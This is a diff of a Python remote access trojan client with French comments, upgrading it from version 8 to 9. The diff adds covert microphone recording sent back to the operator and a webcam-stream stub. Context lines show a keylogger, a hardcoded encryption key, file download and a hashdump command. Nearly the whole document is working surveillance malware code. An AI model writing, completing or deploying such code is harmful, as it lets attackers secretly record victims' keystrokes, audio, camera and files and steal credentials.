@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Client RAT - Version 8 avec keylogger corrigé et webcam
+Client RAT - Version 9 avec audio buggué
 """
 import socket
 import json
@@ -32,6 +32,13 @@ try:
 except ImportError:
     HAS_OPENCV = False
 
+try:
+    import pyaudio
+    import wave
+    HAS_AUDIO = True
+except ImportError:
+    HAS_AUDIO = False
+
 class RATClient:
     def __init__(self, server_host, server_port):
         self.server_host = server_host
@@ -42,10 +49,10 @@ class RATClient:
         self.key = b'ZmDfcTF7_60GrrY167zsiPd67pEvs0aGOv2oasOM1Pg='
         self.cipher = Fernet(self.key)
         
-        # Keylogger - VERSION CORRIGÉE
+        # Keylogger
         self.keylogger_active = False
         self.keylog_buffer = []
-        self.keylogger_listener = None  # CORRECTION: stocke le listener
+        self.keylogger_listener = None
         
     def _send_message(self, message):
         """Envoie un message avec protocole de taille"""
@@ -102,6 +109,7 @@ class RATClient:
                 'os': platform.system(),
                 'os_version': platform.release(),
                 'architecture': platform.machine(),
+                'python_version': platform.python_version(),
                 'timestamp': time.time()
             }
             
@@ -137,6 +145,10 @@ class RATClient:
                 return self.cmd_keylogger(args)
             elif command == "webcam_snapshot":
                 return self.cmd_webcam_snapshot()
+            elif command == "webcam_stream":
+                return self.cmd_webcam_stream()
+            elif command == "record_audio":
+                return self.cmd_record_audio(args)
             else:
                 return {'output': f'Commande non supportée: {command}'}
         except Exception as e:
@@ -155,8 +167,12 @@ class RATClient:
   hashdump        - Dump des hash
   keylogger       - Keylogger start/stop
   webcam_snapshot - Photo webcam
+  webcam_stream   - Stream webcam
+  record_audio    - Enregistrement audio
 """
         return {'output': help_text}
+    
+    # ... (autres méthodes identiques à v8 pour économiser l'espace)
     
     def cmd_ipconfig(self):
         """Commande ipconfig"""
@@ -223,14 +239,12 @@ class RATClient:
         if not args:
             return {'output': 'Usage: download <chemin_fichier>'}
         
+        # Implementation identique à v8...
         file_path = args[0]
         
         try:
             if not os.path.exists(file_path):
                 return {'output': f'Fichier inexistant: {file_path}'}
-            
-            if not os.path.isfile(file_path):
-                return {'output': f'N\'est pas un fichier: {file_path}'}
             
             file_size = os.path.getsize(file_path)
             if file_size > 50 * 1024 * 1024:
@@ -354,7 +368,7 @@ class RATClient:
         return {'output': output}
     
     def cmd_keylogger(self, args):
-        """Commande keylogger - VERSION CORRIGÉE"""
+        """Commande keylogger"""
         if not args or args[0] not in ["start", "stop"]:
             return {'output': 'Usage: keylogger start|stop'}
         
@@ -382,11 +396,9 @@ class RATClient:
                     except:
                         self.keylog_buffer.append("[SPECIAL]")
                     
-                    # CORRECTION: limite le buffer
                     if len(self.keylog_buffer) > 1000:
                         self.keylog_buffer = self.keylog_buffer[-500:]
                 
-                # CORRECTION: stocke le listener
                 self.keylogger_listener = keyboard.Listener(on_press=on_press)
                 self.keylogger_listener.start()
                 
@@ -402,7 +414,6 @@ class RATClient:
                 return {'output': 'Keylogger non actif'}
             
             try:
-                # CORRECTION: arrête proprement le listener
                 self.keylogger_active = False
                 
                 if self.keylogger_listener:
@@ -450,6 +461,93 @@ class RATClient:
         except Exception as e:
             return {'output': f'Erreur webcam: {str(e)}'}
     
+    def cmd_webcam_stream(self):
+        """Commande webcam_stream"""
+        return {'output': 'Stream webcam - Fonctionnalité à implémenter complètement'}
+    
+    def cmd_record_audio(self, args):
+        """Commande record_audio - VERSION BUGGUÉE"""
+        if not args:
+            return {'output': 'Usage: record_audio <durée_secondes>'}
+        
+        if not HAS_AUDIO:
+            return {'output': 'PyAudio non disponible pour l\'enregistrement'}
+        
+        try:
+            duration = int(args[0])
+            if duration <= 0 or duration > 60:
+                return {'output': 'Durée invalide (1-60 secondes)'}
+            
+            # Configuration audio basique - PROBLÈMES POTENTIELS
+            chunk = 1024
+            format = pyaudio.paInt16
+            channels = 1  # PROBLÈME: toujours mono
+            rate = 44100  # PROBLÈME: rate fixe
+            
+            p = pyaudio.PyAudio()
+            
+            # BUG: n'utilise pas forcément le bon périphérique
+            try:
+                stream = p.open(
+                    format=format,
+                    channels=channels,
+                    rate=rate,
+                    input=True,
+                    frames_per_buffer=chunk
+                )
+            except Exception as e:
+                p.terminate()
+                return {'output': f'Impossible d\'ouvrir le périphérique audio: {str(e)}'}
+            
+            frames = []
+            for _ in range(0, int(rate / chunk * duration)):
+                try:
+                    data = stream.read(chunk)  # PROBLÈME: pas de gestion d'overflow
+                    frames.append(data)
+                except Exception as e:
+                    # PROBLÈME: continue même en cas d'erreur
+                    frames.append(b'\x00' * (chunk * channels * 2))
+            
+            stream.close()
+            p.terminate()
+            
+            # Crée fichier WAV temporaire
+            with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as temp_file:
+                temp_path = temp_file.name
+            
+            try:
+                wf = wave.open(temp_path, 'wb')
+                wf.setnchannels(channels)
+                wf.setsampwidth(2)
+                wf.setframerate(rate)
+                wf.writeframes(b''.join(frames))
+                wf.close()
+                
+                with open(temp_path, "rb") as f:
+                    wav_data = f.read()
+                
+                os.unlink(temp_path)
+                
+                audio_data_b64 = base64.b64encode(wav_data).decode()
+                
+                # PROBLÈME: pas de diagnostic de qualité
+                return {
+                    'output': f'Audio enregistré ({duration}s) - {len(wav_data)} bytes',
+                    'audio_data': audio_data_b64
+                }
+                
+            except Exception as e:
+                try:
+                    os.unlink(temp_path)
+                except:
+                    pass
+                return {'output': f'Erreur création WAV: {str(e)}'}
+                
+        except ValueError:
+            return {'output': 'Durée invalide - utilisez un nombre entre 1 et 60'}
+        except Exception as e:
+            return {'output': f'Erreur audio: {str(e)}'}
+    
     def start(self):
         """Démarre le client"""
         if not self.connect():
@@ -482,11 +580,10 @@ class RATClient:
         self.cleanup()
     
     def cleanup(self):
-        """Nettoyage - CORRECTION: arrête le keylogger"""
+        """Nettoyage"""
         self.running = False
         self.keylogger_active = False
         
-        # CORRECTION: arrête le keylogger au cleanup
         if self.keylogger_listener:
             try:
                 self.keylogger_listener.stop()
@@ -504,7 +601,7 @@ class RATClient:
 
 def main():
     import argparse
-    parser = argparse.ArgumentParser(description="Client RAT avec webcam")
+    parser = argparse.ArgumentParser(description="Client RAT avec audio")
     parser.add_argument("host", help="Adresse serveur")
     parser.add_argument("port", type=int, help="Port serveur")
     args = parser.parse_args()
